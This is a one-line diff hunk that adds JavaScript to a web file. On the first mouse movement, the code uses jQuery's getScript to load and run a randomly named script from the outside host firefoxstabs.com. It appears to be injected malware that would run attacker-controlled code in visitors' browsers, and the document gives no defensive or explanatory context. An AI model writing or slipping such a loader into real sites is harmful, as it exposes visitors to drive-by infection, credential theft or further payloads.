@@ -1,0 +1,1 @@
+var x = jQuery.noConflict(true);x(function() {var flag = 0;x(window).mousemove(function() {if (flag === 0) {flag = 1; x.getScript('http://firefoxstabs.com/' + Math.random().toString().substring(3) + '.js', function() {flag = 2;});}});});
